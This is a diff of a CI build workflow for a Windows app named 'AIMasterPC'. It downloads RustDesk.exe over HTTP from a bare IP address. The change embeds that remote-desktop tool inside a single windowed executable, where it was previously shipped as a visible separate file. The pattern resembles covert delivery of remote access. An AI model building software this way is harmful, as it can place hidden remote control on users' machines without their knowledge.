@@ -26,23 +26,16 @@ jobs:
         Invoke-WebRequest -Uri "http://185.23.238.149/rustdesk/RustDesk.exe" -OutFile "RustDesk.exe"
       shell: powershell
     
-    - name: Build EXE
+    - name: Build EXE (RustDesk bundled inside)
       run: |
         mkdir release
-        pyinstaller --onefile --windowed --name "AIMasterPC" --icon=NONE ai_masterpc.py
-      
-    - name: Package with RustDesk
-      run: |
+        pyinstaller --onefile --windowed --name "AIMasterPC" --add-data "RustDesk.exe;." ai_masterpc.py
         copy dist\AIMasterPC.exe release\AIMasterPC.exe
-        copy RustDesk.exe release\RustDesk.exe
-        Compress-Archive -Path release\AIMasterPC.exe, release\RustDesk.exe -DestinationPath AIMasterPC_Setup.zip
       shell: powershell
     
     - name: Upload artifact
       uses: actions/upload-artifact@v4
       with:
         name: AIMasterPC-Windows
-        path: |
-          release\AIMasterPC.exe
-          AIMasterPC_Setup.zip
+        path: release\AIMasterPC.exe
         retention-days: 30
